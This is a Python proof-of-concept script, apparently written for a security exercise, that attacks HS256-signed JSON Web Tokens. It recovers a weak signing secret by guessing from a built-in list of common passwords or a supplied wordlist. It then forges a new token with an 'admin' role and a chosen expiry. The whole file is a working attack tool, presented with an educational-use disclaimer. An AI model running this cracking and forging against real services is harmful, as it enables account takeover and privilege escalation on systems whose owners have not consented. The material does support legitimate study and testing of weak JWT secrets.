#!/usr/bin/env python3
"""
JWT Security Task — PoC: weak-secret forgery + dictionary crack
Author: Prethivi V.S.

Usage:
  python jwt_attack_demo.py forge --secret SECRET --sub user1 --role admin --exp-min 15
  python jwt_attack_demo.py crack --token <JWT> [--wordlist common_secrets.txt]

Notes:
  • For educational use on your own test systems only.
  • Requires: PyJWT (pip install pyjwt)
"""

import argparse, sys, time, json, base64, hashlib
from datetime import datetime, timedelta, timezone
from typing import Optional, Tuple, Dict

try:
    import jwt  # PyJWT
except Exception as e:
    print("[!] PyJWT not installed. Run: pip install pyjwt", file=sys.stderr)
    raise

COMMON_SECRETS = [
    "secret","password","123456","admin","jwtsecret","secret123",
    "letmein","qwerty","123456789","iloveyou","welcome","changeme",
    "passw0rd","toor","abc123","test","testing","supersecret",
    "mysecret","12345678","12345","monkey","dragon","shadow"
]

def forge(secret: str, sub: str, role: str, exp_min: int) -> str:
    now = datetime.now(timezone.utc)
    payload = {
        "sub": sub,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(minutes=exp_min)).timestamp()),
        "iss": "jwt-poc-local",
        "aud": "jwt-poc-client"
    }
    token = jwt.encode(payload, secret, algorithm="HS256")
    # PyJWT v2+ returns str
    return token

def crack(token: str, wordlist_path: Optional[str]) -> Optional[Tuple[str, Dict]]:
    # load candidates
    candidates = []
    if wordlist_path:
        try:
            with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        candidates.append(line)
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist_path}", file=sys.stderr)
            return None
    # merge with built-ins without duplicates
    candidates.extend([c for c in COMMON_SECRETS if c not in candidates])

    tried = 0
    for secret in candidates:
        tried += 1
        try:
            data = jwt.decode(
                token,
                secret,
                algorithms=["HS256"],
                audience="jwt-poc-client",
                options={"verify_aud": False}  # keep decode lenient on aud for this PoC
            )
            # If decode didn't raise, signature matched: secret recovered
            return secret, data
        except jwt.ExpiredSignatureError:
            # Signature verified but token expired -> secret is correct
            return secret, {"_note": "Token expired but signature verified. Secret recovered."}
        except jwt.InvalidTokenError:
            pass

        if tried % 1000 == 0:
            print(f"[*] Tried {tried} candidates...", file=sys.stderr)

    return None

def main():
    ap = argparse.ArgumentParser(description="JWT weak-secret PoC (educational use only)")
    sub = ap.add_subparsers(dest="cmd")
    # For Python <3.7 compatibility, avoid required=True on add_subparsers
    # We'll check None explicitly.

    ap_forge = sub.add_parser("forge", help="Forge a token if secret is weak/known (HS256)")
    ap_forge.add_argument("--secret", required=True, help="HS256 shared secret (e.g., 'secret123')")
    ap_forge.add_argument("--sub", default="user1")
    ap_forge.add_argument("--role", default="admin")
    ap_forge.add_argument("--exp-min", type=int, default=15)

    ap_crack = sub.add_parser("crack", help="Dictionary-guess HS256 secret from an existing token")
    ap_crack.add_argument("--token", required=True, help="JWT to attempt to verify")
    ap_crack.add_argument("--wordlist", help="Path to newline-delimited candidate secrets")

    args = ap.parse_args()
    if args.__dict__.get("cmd") is None:
        ap.print_help(sys.stderr)
        sys.exit(2)

    if args.cmd == "forge":
        token = forge(args.secret, args.sub, args.role, args.exp_min)
        print(token)
        print("\n[+] Forged HS256 token with role='{}' (expires in {} min).".format(args.role, args.exp_min), file=sys.stderr)
        print("[!] WARNING: If a production API accepts tokens signed with weak/guessable secrets, it is vulnerable.", file=sys.stderr)

    elif args.cmd == "crack":
        res = crack(args.token, args.wordlist)
        if res:
            secret, data = res
            print(f"[+] Recovered HS256 secret: {secret}")
            print("[+] Decoded claims:")
            print(json.dumps(data, indent=2, sort_keys=True))
            print("\n[!] You can now forge a new token with elevated privileges using this secret.")
        else:
            print("[-] No match found in the provided/common candidates.", file=sys.stderr)

if __name__ == "__main__":
    main()
